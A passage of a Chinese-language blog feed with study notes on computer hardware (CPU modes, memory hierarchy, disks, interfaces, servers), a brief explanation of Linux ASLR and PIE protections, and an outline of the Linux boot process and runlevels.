alt="image-20210529124237752"></p><p>后来CPU被设计成了流水线式，即执行指令n时，可以对指令n+1解码，并且可以读取指令n+2,这样就不需要等待某个单元执行完了。<br>再后来出现了超变量cpu比流水线更加先进，CPU有多个执行单元，可以同时处理不同的线程，两个或更多的指令被同时取出、解码并装入一个保持缓冲区中，直至它们都执行完毕。只要有一个执行单元空闲，就会检查保持缓冲区是否还有可处理的指令，但这种设计存在一种缺陷，即程序的指令经常不按照顺序执行，在多数情况下，硬件负责保证这种运算结果与顺序执行的指令时的结果相同。</p><p><img src="/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/cach/image-20210529124718848.png" alt="image-20210529124718848"></p><p>3.7 内核态与用户态</p><p>为了保证系统安全需要限制不同程序间的访问能力，防止程序A获取程序B的内存数据或外围设备数据，因此CPU划分了两种模式限制权限等级，即内核态与用户态：<br>内核态：cpu可以访问内存的所有数据，包括外围设备，例如硬盘，网卡，cpu也可以将自己从一个程序切换到另一个程序。<br>用户态：只能受限的访问内存，且不允许访问外围设备，占用cpu的能力被剥夺，cpu资源可以被其他程序获取。<br>通常PSW寄存器中有一个二进制位控制这两种模式。<br>一般情况下所有用户程序都运行在用户态, 但有时程序需要进入内核态执行必要的行为, 例如从硬盘读取数据, 或者从键盘获取输入等，这时需要一个这样的机制: 用户态程序切换到内核态, 但不能控制在内核态中执行的指令，这种机制叫系统调用, 在CPU中的实现称之为陷阱指令，过程是:<br>1、用户态程序将一些数据值放在寄存器中, 或者使用参数创建一个堆栈来保存状态<br>2、然后用户态程序通过操作系统执行系统调用<br>3、CPU切换到内核态并跳到位于内存指定位置的指令, 这些指令是操作系统的一部分, 他们具有内存保护, 不可被用户态程序访问<br>4、这些指令称之为陷阱或系统调用，他们会读取程序放入内存的数据参数, 并执行程序请求的服务<br>5、系统调用完成后, 操作系统重置CPU为用户态并返回系统调用的结果</p><p>3.8 运算器和控制器</p><p>常将运算器和控制器合称为中央处理器CPU，其中运算器主要负责程序运算与逻辑判断，控制器则主要协调各组件和各单元的工作，<br>　　运算器是对信息进行处理和运算的部件。经常进行的运算是算术运算和逻辑运算，所以运算器又可称为算术逻辑运算部件（Arithmetic and Logical，ALU），运算器的核心是加法器，运算器中还有若干个通用寄存器或累加寄存器，用来暂存操作数并存放运算结果，寄存器的存取速度比存储器的存放速度快很多。<br>　　控制器是整个计算机的指挥中心，它的主要功能是按照人们预先确定的操作步骤，控制整个计算机的各部件有条不紊的自动工作，控制器从主存中逐条地读取出指令进行分析，根据指令的不同来安排操作顺序，向各部件发出相应的操作信号，控制它们执行指令所规定的任务，控制器中包括一些专用的寄存器。</p><p>3.9 多线程和多核芯片</p><p>moore定律指出芯片中的晶体管数量每18个月翻一倍，随着晶体管数量的增多，更强大的功能成为了可能，如：</p><p>1.第一步增强：在cpu芯片中加入更大的缓存，一级缓存L1，用和cpu相同的材质制成，cpu访问它没有时延。</p><p>2.第二步增强：一个cpu中的处理逻辑增多，intel公司首次提出，称为多线程（multithreading）或超线程（hyperthreading），对用户来说一个有两个线程的cpu就相当于两个cpu，进程是资源单位而线程才是cpu的执行单位。</p><p>多线程运行cpu保持两个不同的线程状态，可以在纳秒级的时间内来回切换，速度快到你看到的结果是并发的，伪并行的，然而多线程不提供真正的并行处理，一个cpu同一时刻只能处理一个进程（一个进程中至少一个线程）。</p><p>3.第三步增强：除了多线程，还出现了完整处理器的cpu芯片，要使用这类多核芯片需要有多处理操作系统。</p><h2 id="4、存储器介绍"><a href="#4、存储器介绍" class="headerlink" title="4、存储器介绍"></a>4、存储器介绍</h2><p>为了协调兼顾速度快、容量大、价钱便宜存储器使用如下的不同的处理方式，存储器系统采用如下图的分层结构，顶层的存储器速度较高，容量较小，与底层的存储器相比每位的成本较高。其性能差别往往是十亿数量级的：</p><p><img src="/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/cach/image-20210529131840599.png" alt="image-20210529131840599"></p><p>ps：ns=纳秒/毫微秒，十亿分之一秒，ms=毫秒1毫秒=0.001 秒，s=秒<br>计算机的基本储存单元：<br>位(bit)：二进制数中一个数位，可以是0或者1，是计算机中数据的最小单位。<br>字节(Byte，B)：计算机中数据基本单位，每8位组成一个字节，各种信息在计算机中存储、处理至少需要一个字节，例如，一个ASCII码用一个字节表示，一个汉字用两个字节表示。<br>1KB=1024B，1MB=1024KB，1GB=1024MB</p><p>4.1 寄存器</p><p>寄存器存储二进制代码，由具有存储功能的触发器构成，一个触发器可以存储1位二进制代码，存放n位二进制代码的寄存器需用n个触发器来构成，用与cpu相同材质制造，与cpu一样快，因而cpu访问它无时延，典型容量是：在32位cpu中为32<em>32，在64位cpu中为64</em>64，在两种情况下容量均&lt;1KB</p><p>4.2 高速缓存</p><p>主要由硬件控制高速缓存的存取，内存中有高速缓存行按照0<del>64字节为行0，64</del>127为行1。。。表示，最常用的高速缓存行放置在cpu内部或者非常接近cpu的高速缓存中，当某个程序需要读一个存储字时，高速缓存硬件检查所需要的高速缓存行是否在高速缓存中，如果是，则称为高速缓存命中，缓存满足了请求，就不需要通过总线把访问请求送往主存(内存)，这毕竟是慢的。高速缓存的命中通常需要两个时钟周期，如果高速缓存未命中就必须访问内存，这需要付出大量的时间代价。由于高速缓存价格昂贵，所以其大小有限，有些机器具有两级甚至三级高速缓存，每一级高速缓存比前一级慢但是容易大。<br>缓存在计算机科学的许多领域中起着重要的作用，并不仅仅只是RAM（随机存取存储器）的缓存行。只要存在大量的资源可以划分为小的部分，那么这些资源中的某些部分肯定会比其他部分更频发地得到使用，此时用缓存可以带来性能上的提升，一个典型的例子就是操作系统一直在使用缓存，比如，多数操作系统在内存中保留频繁使用的文件（或其中一部分），以避免从磁盘中重复地调用这些文件，如/root/a/b/c/d/e/f/a.txt的长路径名转换成该文件所在的磁盘地址的结果然后放入缓存，可以避免重复寻找地址，还有一个web页面的地址转换为网络地址(IP)地址后，这个转换结果也可以缓存起来供将来使用。</p><p>4.3 内存</p><p>在计算机的组成结构中有一个很重要的部分是存储器。它用来存储程序和数据，存储器的种类很多。按其用途可分为主存储器和辅助存储器，主存储器又称内存储器（简称内存），内存又叫主存，它是CPU能直接寻址的存储空间，由半导体器件制成，存取速率快。<br>内存是电脑中的主要部件，它是相对于外存而言的。<br>我们平常使用的程序，如：Windows操作系统、打字软件、游戏软件等一般安装在硬盘等外存上，但要使用其功能，必须把它们调入内存中运行，才能真正使用其功能。<br>电脑通电时使用和保存的数据其实是在内存中进行，不管是要使用还是储存都需要通过向硬盘读取和写入完成，我们把要永久保存、大量数据存储在外存上，把一些临时或少量的数据和程序放在内存上，内存的好坏会直接影响电脑的运行速度。<br>关于内存的3条信息：</p><ol><li>内存里存放的都是电信号，断电数据则丢失。</li><li>cpu是从内存中取出指令来运行的，运行指令产生的数据也会放入内存中，所以内存又称之为主存，因为程序运行过程中产生的数据都是先存放于内存中。</li><li>内存的速度一般用存取时间衡量，每次与CPU间数据处理耗费的时间以纳秒(ns)为单位。大多数内存芯片的存取时间为5、6、7、8或10ns。</li></ol><p>4.4 硬盘</p><p>磁盘(disk)是利用磁记录技术存储数据的存储器，它是计算机主要的存储介质，可以存储大量的二进制数据，并且断电后也能保持数据不丢失，早期计算机使用的磁盘是软磁盘（Floppy Disk，简称软盘），如今常用的磁盘是硬磁盘（Hard disk，简称硬盘）。<br>辅助存储（大多都是磁盘），因为它们能够存储大量需要长期保存的数据。<br>根据机械原理，存储器的容量越大其速度就越慢。但是速度越快的存储器，其单位字节的价格就越贵，现代计算机系统可以包含几个不同的可以存储数据的部件，就形成了存储器的层次结构，但是需要注意的是“虚拟内存”是操作系统与操作系统运用机器硬件的产物，它不是存储器的层次之一。</p><p>4.5 机械硬盘</p><p>传统的硬盘盘结构有一个或多个盘片来存储数据，盘片多采用铝合金材料；中间有一个主轴，所有的盘片都绕着这个主轴转动，一个组合臂上有多个磁头臂，每个磁头臂上面都有一个磁头，负责读写数据。</p><p>磁盘一般有一个或多个盘片。每个盘片可以有两面，即第一个盘片的正面为0面，反面为 1 面；第二个盘片的正面为 2 面…依次类推。磁头的编号和盘面的编号一样，因此有多少个盘面就有多少个磁头，磁头的传动臂只能在盘片的内外磁道之间移动，因此不管开机还是关机，磁头总是在盘片上面，关机时，磁头停在盘片上面，抖动容易划伤盘面造成数据损失，为了避免这样的情况，所以磁头都是停留在起停区的，起停区没有数据。</p><p>每个盘片的盘面被划分成多个狭窄的同心圆环，数据存储在同心圆环上面，我们将这样的圆环称为磁道 (Track)，每个盘面可以划分多个磁道，最外圈的磁道是0号磁道，向圆心增长依次为1磁道、2磁道…磁盘的数据存放就是从最外圈开始的。</p><p>根据硬盘的规格不同，磁道数可以从几百到成千上万不等，每个磁道可以存储数Kb数据，但是计算机不必要每次都读写这么多数据，因此，再把每个磁道划分为若干个弧段，每个弧段就是一个扇区 (Sector)，扇区是硬盘上存储的物理单位，现在每个扇区可存储 512 字节数据已经成了业界的约定，也就是说，即使计算机只需要某一个字节的数据，也得把这个 512 个字节的数据全部读入内存，再选择所需要的那个字节。</p><p>柱面是我们抽象出来的一个逻辑概念，简单来说就是处于同一个垂直区域的磁道称为柱面，即各盘面上面相同位置磁道的集合。需要注意的是，磁盘读写数据是按柱面进行的，磁头读写数据时先在同一柱面内从0磁头开始进行操作，依次向下在同一柱面的不同盘面(即磁头上)进行操作，只有在同一柱面所有的磁头全部读写完毕后磁头才转移到下一柱面，因为选取磁头只需通过电子切换即可，而选取柱面则必须通过机械切换，数据的读写是按柱面进行的，而不是按盘面进行，所以把数据存到同一个柱面是很有价值的。<br>磁盘被磁盘控制器所控制（可控制一个或多个），它是一个小处理器，可以完成一些特定的工作。比如将磁头定位到一个特定的半径位置；从磁头所在的柱面选择一个扇区；读取数据等。</p><p>磁盘低速的原因是因为它一种机械装置，在磁盘中有一个或多个金属盘片，它们以5400，7200或10800rpm（RPM =revolutions per minute 每分钟多少转 ）的速度旋转，从边缘开始有一个机械臂悬在盘面上，类似于老式黑胶唱片机上的拾音臂，信息卸载磁盘上的一些列的同心圆上，是一连串的2进制位（称为bit位），为了统计方法，8个bit称为一个字节bytes，1024bytes=1k，1024k=1M，1024M=1G,所以我们平时所说的磁盘容量最终指的就是磁盘能写多少个2进制位。<br>1、磁盘里存放的是磁信号，固态硬盘里存放的是电子，断电数据都不会丢失。<br>2、程序运行过程中产生的数据一定是先存放于内存中的，若想永久保存，必须由内存先放入如硬盘中。</p><p>ps：硬盘上也有缓存芯片。每个磁头可以读取一段换新区域，称为磁道，把一个戈丁手臂位置上所以的磁道合起来，组成一个柱面，每个磁道划成若干扇区，扇区典型的值是512字节。<br>数据都存放于一段一段的扇区，即磁道这个圆圈的一小段圆圈，从磁盘读取一段数据需要经历寻道时间和延迟时间。<br>平均寻道时间：<br>机械手臂从一个柱面随机移动到相邻的柱面的时间成为寻道时间，找到了磁道就以为着招到了数据所在的那个圈圈，但是还不知道数据具体这个圆圈的具体位置。<br>平均延迟时间：<br>机械臂到达正确的磁道之后还必须等待旋转到数据所在的扇区下，这段时间成为延迟时间。</p><p>4.6 固态硬盘 </p><p>固态硬盘(Solid State Drives)，简称固盘(SSD)，固态硬盘(Solid State Drive)用固态电子储存芯片阵列而制成的硬盘，由控制单元和储存单元(FLASH芯片、DRAM芯片)组成，固态硬盘在接口的规范和定义、功能及运用方式上与普通硬盘的完全相同，在产品外形和尺寸上也完全与普通硬盘一致。被广泛使用于军事、车载、工控、视频监控、网络监控、网络终端、电力、医疗、航空、导航设备等领域。<br>固态硬盘具有传统机械硬盘不具备的快速读写、质量轻、能耗低以及体积小等特点，同时其劣势也较为显著。其价格仍较为昂贵，容量较低，一旦硬件破坏，数据较难恢复等;并且亦有人认为固态硬盘的耐用性(寿命)相对较短。<br>从2016年装电脑，无论您买什么配置的电脑，都建议搭配固态硬盘(SSD)，固态硬盘绝不仅仅是开机快，能带来更流畅的操控感受 。最简单比如开个浏览器，机械硬盘可能要3秒，固态硬盘1.5秒，就这么1秒多的分别，感觉就不一样。</p><p>4.7 硬盘接口</p><p>硬盘接口是硬盘与主机系统间的连接部件，作用是在硬盘缓存和主机内存之间传输数据。不同的硬盘接口决定硬盘与计算机之间的连接速度，在整个系统中，硬盘接口的优劣直接影响着程序运行快慢和系统性能好坏，如果把硬盘比喻一个盛水的瓶子，那么无论硬盘本身容量多大、速度多快，最终流水的速度都会卡在瓶口上，这个瓶口就是硬盘的接口，也就是说决定硬盘读写速度不仅仅是硬盘本身，还有硬盘的接口。</p><p>IDE接口即并行IDE接口（PATA接口），使用并行接口的硬盘既称为并口硬盘，IDE是一种较老的技术，在几年前很常见，目前在在硬盘方面基本不再使用此接口，其接口连接比较简单，将它们与主板或接口卡连起来就可以了，把盘体与控制器集成在一起的做法减少了硬盘接口的电缆数目与长度，数据传输的可靠性得到了增强，硬盘制造起来变得更容易，因为厂商不需要再担心自己的硬盘是否与其它厂商生产的控制器兼容，对用户而言，硬盘安装起来也更为方便，虽然有这些优势，但其传输最大只能是133MB/s，远远低于串口的600MB/s的速度，且在其他方面也不如SATA串行接口，所以其逐渐被淘汰已经成为必然。</p><p>如若提高传输速率，那么传输的数据和信号往往会产生干扰，导致错误。在这种情况下，串行接口技术就产生了。</p><p>SATA接口（SerialATA）又称为串行ATA，是一种接口技术，使用SATA接口的硬盘又叫串口硬盘，其最终将取代使用IDE接口的并口硬盘，SATA接口的历史：2001年，由Intel、APT、Dell、IBM、希捷、迈拓这几大厂商组成的SerialATA委员会正式确立了SerialATA1.0规范。2002年，虽然串行ATA的相关设备还未正式上市，但SerialATA委员会已抢先确立了SerialATA2.0规范。SerialATA采用串行连接方式，串行ATA总线使用嵌入式时钟信号，具备了更强的纠错能力，与以往相比其最大的区别在于能对传输指令（不仅仅是数据）进行检查，如果发现错误会自动矫正，这在很大程度上提高了数据传输的可靠性。串行接口还具有结构简单、支持热插拔的优点。串口硬盘是一种完全不同于并行ATA的新型硬盘接口类型，由于采用串行方式传输数据而知名。相对于并行PATA来说，就具有非常多的优势。<br>一，传输速率高（最大的优势）<br>首先，SerialATA以连续串行的方式传送数据，一次只会传送1位数据。这样能减就可满足数据传输的需要。由于传输数据线较少，使得SATA在物理线路的电气性能方面的干扰大大减小，这也保证了未来磁盘传输率进一步的提升。和并行ATA相比，串行ATA的数据线更细小，这也使得机箱内部的连线比较容易整理，有助于机箱内部空气的流通，使得机箱内部的散热更好。同样，串行ATA还有采用非排针脚设计的接口和支持热插拔功能等优点。<br>　　<br>扩展：热插拔 （Hot Swap） 即带电插拔，指的是在不关闭系统电源的情况下，将模块、板卡插入或拔出系统而不影响系统的正常工作，从而提高了系统的可靠性、快速维修性、冗余性和对灾难的及时恢复能力等，对于大功率模块化电源系统而言，热插拔技术可在维持整个电源系统电压的情况下，更换发生故障的电源模块，并保证模块化电源系统中其他电源模块正常运作。</p><p>随着小型机退出历史舞台该接口也随即没落，SCSI主要用于服务器，英文全称为“Small Computer System Interface”（[小型计算机系统接口]，是同IDE（ATA）完全不同的接口，IDE接口是普通PC的标准接口，而SCSI并不是专门为硬盘设计的接口，是一种广泛应用于[小型机]的高速数据传输技术。</p><p>SAS(Serial Attached SCSI)即串行连接SCSI，是新一代的SCSI技术，和现在流行的Serial ATA(SATA)硬盘相同，都是采用串行技术以获得更高的传输速度，并通过缩短连结线改善内部空间等。SAS是并行SCSI接口之后开发出的全新接口。此接口的设计是为了改善[存储系统]的效能、可用性和扩充性，并且提供与SATA硬盘的兼容性。<br>（以往我们都是通过SCSI或者SATA接口及硬盘来完成数据存储工作。正因为SATA技术的飞速发展以及多方面的优势，才会让更多的人考虑能否存在一种方式可以将SATA与SCSI两者相结合，这样就可以同时发挥两者的优势了。在这种情况下SAS应运而生。）</p><p>光纤通道主要用于高端服务器场景，价格昂贵，英文拼写是Fibre Channel，和[SCSI接口]一样光纤通道最初也不是为硬盘设计开发的接口技术，是专门为网络系统设计的，但随着[存储系统]对速度的需求，才逐渐应用到硬盘系统中。</p><p>ps：存储容量单位</p><p>1DB=1024NB； // DB(DoggaByte)<br>1NB=1024BB， // NB(NonaByte）<br>1BB=1024YB； // BB（BrontoByte）<br>1YB=1024ZB； // 尧字节 (YB，YottaByte)<br>1ZB=1024EB； // 泽字节(ZB，ZettaByte)<br>1EB=1024PB； // 艾字节(EB，ExaByte)<br>1PB=1024TB； // 拍字节(PB，PetaByte)<br>1TB=1024GB； // 太字节（TB，TeraByte）<br>1GB=1024MB； // 吉字节（GB，Gigabyte）<br>1MB=1024KB； // 兆字节（MB，MegaByte）<br>1KB=1024B   // 千字节（KB，KiloByte）<br>1B=8bit     // 字节（B，Byte）<br>市面上卖硬盘的都是按1000计算，号称500G硬盘=500*1000B*1000KB*1000MB</p><h2 id="5、主板"><a href="#5、主板" class="headerlink" title="5、主板"></a>5、主板</h2><p>主板上集成了各种硬件设备和接口，包括CPU、存储器、I/O设备等，所有的板卡都需要通过主板发挥作用，主板性能的优劣直接影响到整个系统。</p><p>主板芯片组是主板上最重要的部件，主板的功能主要取决于芯片组，芯片组负责管理CPU和内存、各种总线扩展以及外设的支持。</p><p><img src="/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E5%AD%A6%E4%B9%A0/cach/v2-d682e7296e93fde17aae4b8a34ec492a_720w.jpg" alt="img"></p><p>BIOS(basic input output system)芯片（CMOS芯片）：负责主板通电后各部件自检，设置，保存，一切正常后才能启动操作系统，它记录了电脑最基本的信息，是软件与硬件打交道的最基础的桥梁，没有它电脑就不能工作。<br>常见的三种BIOS：Award、AMI、Phoenix</p><p>PCI槽可以用来插声卡、网卡等。</p><h2 id="6、机箱"><a href="#6、机箱" class="headerlink" title="6、机箱"></a>6、机箱</h2><p>台式机机箱</p><p>服务器机箱</p><h2 id="7、主板电源"><a href="#7、主板电源" class="headerlink" title="7、主板电源"></a>7、主板电源</h2><p>为了保证服务器的正常用电计算机设计了几种方法应对可能发生的断电情况，个人PC机也有部分模式保护断电。</p><p>7.1 服务器双电源模式</p><p>7.2 电源模块连接线接到不同插件板上</p><p>7.3 UPS(不间断电源)</p><p>UPS全名为Uninterruptable Power System(或Uninterruptable Power Supply)，相当于一个蓄电池，相当于服务器的电池，相当于为服务器配备像笔记本电脑一样的电池，在突然断电的情况下，为电话供电一段时间，至于可能供电多久，具体得看ups的功率，在市电停掉的情况下，一般个人pc的ups可以成5到20分钟，服务器ups可以撑到几个小时，期间可以为运维人员腾出时间来解决电的问题。</p><h2 id="8、风扇组"><a href="#8、风扇组" class="headerlink" title="8、风扇组"></a>8、风扇组</h2><p>为CPU降温</p><h2 id="9、服务器"><a href="#9、服务器" class="headerlink" title="9、服务器"></a>9、服务器</h2><p>9.1 机架式服务器</p><p>机架式服务器如果有机柜有托盘，直接放进去即可，如果没有需要安装导轨.</p><p>9.2 刀片服务器</p><p>刀片服务器(刀片式服务器)是指在标准高度的机架式机箱内可插装多个卡式的服务器单元，实现高可用和高密度。每一块”刀片”实际上就是一块系统主板。它们可以通过”板载”硬盘启动自己的操作系统，如Windows NT/2000、Linux等，类似于一个个独立的服务器，在这种模式下，每一块母板运行自己的系统，服务于指定的不同用户群，相互之间没有关联，因此相较于机架式服务器和机柜式服务器，单片母板的性能较低。不过，管理员可以使用系统软件将这些母板集合成一个服务器集群。在集群模式下，所有的母板可以连接起来提供高速的网络环境，并同时共享资源，为相同的用户群服务。在集群中插入新的”刀片”，就可以提高整体性能。而由于每块”刀片”都是热插拔的，所以，系统可以轻松地进行替换，并且将维护时间减少到最小</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/367158550">https://zhuanlan.zhihu.com/p/367158550</a></p><p><a href="https://zhuanlan.zhihu.com/p/367991066">https://zhuanlan.zhihu.com/p/367991066</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;计算机硬件的学习笔记。&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机组成" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/"/>
    
  </entry>
  
  <entry>
    <title>Linux下aslr与pie</title>
    <link href="http://example.com/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/"/>
    <id>http://example.com/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/</id>
    <published>2021-06-05T12:32:15.000Z</published>
    <updated>2021-06-05T12:46:52.619Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>aslr保护机制与pie保护机制的关系</p><span id="more"></span><h2 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h2><p>aslr(Address space layout randomization)地址空间布局随机化是和pie共同作用以针对缓冲区溢出的一种安全保护技术，作用在程序映射到内存时，通过对加载的虚拟地址进行随机化实现对栈、堆、共享库等线性区的布局随机化，以此避免攻击者定位到确定的函数、gadgets等攻击代码位置达成阻止溢出的目的。</p><p>aslr分为3个等级：</p><p>0、关闭aslr，无任何作用</p><p>1、部分随机化，随机化stack、共享库、mmap()及VDSO的基地址</p><p>2、完全随机化，在1的基础上增加brk()分配的堆内存空间随机化</p><p>ps：aslr是系统自动设置的(也可手动关闭)，开启了aslr后程序每次运行都起作用，即使计算机重启后运行程序也起作用。只开启aslr保护机制的程序中的未初始化全局变量、初始化全局变量和代码段数据段都没变化，但程序中的局部变量地址会发生改变。</p><h2 id="pie"><a href="#pie" class="headerlink" title="pie"></a>pie</h2><p>pie(position-independent executable)地址无关可执行文件是一种与aslr共同使用以对抗缓冲区溢出的一种安全保护机制，在程序编译时设置，针对代码段、数据段、.bss段等固定地址，开启了pie的程序每次每次加载时加载地址都会变换，从而影响如ROPgadget等工具查找gadgets。</p><p>ps：开启了pie的程序会打乱代码段、数据段、plt、got的基址。</p><h2 id="aslr与pie的配合使用"><a href="#aslr与pie的配合使用" class="headerlink" title="aslr与pie的配合使用"></a>aslr与pie的配合使用</h2><p>aslr和pie只开启一个都不足以进行绕过，而两者同时开启可以杜绝大部分针对缓冲区的信息泄露。</p><p>之所以只开启aslr不足以防御缓冲区溢出是因为代码段、数据段等地址没有打乱，还是可以通过泄露其中的数据如plt、got表来获取libc进而得到可利用函数绕过aslr或其中的gadgets，而只开启了pie而没有开启aslr可以直接通过libc获取可利用的函数或gadgets，只有2者同时开启才可以完全避免信息泄露(pwn题中给泄漏点泄露不算)。</p><p>下图是没开pie只开启了aslr的程序的内存地址对比：</p><p><img src="/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/cach/image-20210603162553526.png" alt="image-20210603162553526"></p><p><img src="/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/cach/image-20210603162606021.png" alt="image-20210603162606021"></p><p>下图是开启了pie和aslr的程序的内存地址对比：</p><p><img src="/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/cach/image-20210603163104032.png" alt="image-20210603163104032"></p><p><img src="/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/cach/image-20210603163201647.png" alt="image-20210603163201647"></p><p>下图是只开启了pie没开启aslr的程序的内存地址区别：</p><p><img src="/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/cach/image-20210603170112481.png" alt="image-20210603170112481"></p><p><img src="/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/cach/image-20210603170149284.png" alt="image-20210603170149284"></p><p>总结：</p><p>只开启aslr没开启pie的程序stack、libc等地址会被打乱，代码段等不变。</p><p>只开启pie没开启aslr的程序基地址都不变，只有开启了aslr pie才会起作用。</p><p>开启了aslr和pie的程序stack、lib、代码段、数据段等地址都被打乱。</p><p>最后，现实中的Linux中大部分网络进程会开启pie，但其他大部分程序因为时性能问题(开启pie会导致额外的操作)并没有开启pie，开启pie和未开启pie的程序在几年前的比例可以参考下图：</p><p><img src="/2021/06/05/Linux%E4%B8%8Baslr%E4%B8%8Epie/cach/image-20210603173125093.png" alt="image-20210603173125093"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;aslr保护机制与pie保护机制的关系&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统启动流程</title>
    <link href="http://example.com/2021/06/05/Linux%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/"/>
    <id>http://example.com/2021/06/05/Linux%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/</id>
    <published>2021-06-05T12:31:49.000Z</published>
    <updated>2021-06-05T12:46:20.512Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录的Linux系统从通电到操作系统启动流程</p><span id="more"></span><h2 id="Linux系统启动"><a href="#Linux系统启动" class="headerlink" title="Linux系统启动"></a>Linux系统启动</h2><p>Linux启动流程：</p><p><img src="/2021/06/05/Linux%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B/cach/image-20210529110636068.png" alt="image-20210529110636068"></p><p>1.1</p><p>BIOS即基本输入输出系统(basic input output system)，本质上是一个固化在主板ROM芯片(或者BIOS芯片)上的一个程序，负责基本输入输出、开机后自检和系统自启动，为计算机提供最底层的硬件设备控制，它包括了CPU的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息和PnP特性等。当计算机通电后不知道任何关于这台设备的信息，此时就会先加载BIOS放入内存中读取指令，再检查硬件设备、确定硬件完好后到启动设备中去搜索MBR。</p><p>1.2</p><p>MBR(Master Boot Record)是主引导程序，在硬盘上磁道的第一个扇区上，大小为512字节，存放预启动信息、分区表信息，当系统执行到MBR后将其中的Boot Loader(grub或Lilo)复制到物理内存0x7c00地址处开始执行指令。</p><p>1.3</p><p>Boot Loader(包括Grub、Lilo和spfdisk等)是操作系统内核运行前的一小段初始化程序，通过Boot Loader初始化硬件设备建立内存空间映射图，创造系统软硬件运行环境为调用操作系统内核做准备，之后Boot Loader读取分区表寻找操作系统。</p><p>1.4</p><p>配置好信息找到操作系统后根据grub设定的内核映像所在路径，系统读取内存映像并进行解压缩操作，此时屏幕一般会输出“Uncompressing Linux”的提示，当解压缩内核完成后屏幕输出“OK, booting the kernel”，同时系统会将解压后的内核放置在内存中，并调用start_kernel()函数来启动一系列的初始化函数并初始化各种设备，完成Linux核心环境的建立。至此，Linux内核已经建立起来了，基于Linux的程序应该可以正常运行了。</p><p>1.5</p><p>内核加载完后会启动Linux操作系统第一个守护进程init，通过该进程读取/etc/inittab文件，/etc/inittab文件会设定Linux的运行等级，Linux常见运行级别如下<br>0：关机模式<br>1：单用户模式<br>2：无网络支持的多用户模式<br>3：字符界面多用户模式<br>4：保留，未使用模式<br>5：图像界面多用户模式<br>6：重新引导系统，重启模式</p><p>1.6</p><p>读取完运行级别后Linux系统执行第一个用户层文件/etc/rc.d/rc.sysinit，该文件功能可以设定PATH运行变量、设定网络配置、启动swap分区、设定/proc、系统函数、配置Selinux等。</p><p>1.7</p><p>之后读取/etc/modules.conf文件及/etc/modules.d目录下的文件加载系统内核模块，内核模块可以添加或者修改及删除。</p><p>1.8</p><p>根据之前读取的运行级别，操作系统会运行rc0.d到rc6.d中相应的脚本程序来完成相应的初始化工作和启动相应的服务。</p><p>1.9</p><p>操作系统启动完相应服务后读取执行/etc/rc.d/rc.local文件，这一步可以将需要开机启动的任务加入到该文件末尾，系统会逐行去执行并启动相应命令，rc.local就是Linux在一切初始化工作后留给用户进行个性化的地方。</p><p>1.10</p><p>最后就是执行/bin/login程序启动到系统登录界面，操作系统等待用户输入用户名和密码登录到Shell终端，至此Linux操作系统完整流程启动完毕，此时系统已经进入到了等待用户输入username和password的时候了，你已经可以用自己的帐号登入系统了。</p><h2 id="Linux启动级别"><a href="#Linux启动级别" class="headerlink" title="Linux启动级别"></a>Linux启动级别</h2><p>运行级别0：系统停机状态，系统默认运行级别不能设为0，否则不能正常启动<br>运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆<br>运行级别2：多用户状态(没有NFS)<br>运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式<br>运行级别4：系统未使用，保留<br>运行级别5：X11控制台，登陆后进入图形GUI模式<br>运行级别6：系统正常关闭并重启，默认运行级别不能设为6，否则不能正常启动</p><h3 id="设置启动级别为3"><a href="#设置启动级别为3" class="headerlink" title="设置启动级别为3"></a>设置启动级别为3</h3><p>Linux系统默认启动等级为5、可已使用init命令切换启动级别。<br>[root@fly ~]# init 3</p><h3 id="传统的设置方法"><a href="#传统的设置方法" class="headerlink" title="传统的设置方法"></a>传统的设置方法</h3><p>通过查看CentOS7的/etc/inittab文件</p><h3 id="修改系统为多用户命令行界面"><a href="#修改系统为多用户命令行界面" class="headerlink" title="修改系统为多用户命令行界面"></a>修改系统为多用户命令行界面</h3><p>systemctl set-default multi-user.target</p><h3 id="修改系统为图形界面"><a href="#修改系统为图形界面" class="headerlink" title="修改系统为图形界面"></a>修改系统为图形界面</h3><p>systemctl set-default graphical.target</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录的Linux系统从通电到操作系统启动流程&lt;/p&gt;</summary>
    
    
    
    
    <category term="操作系统" scheme="http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
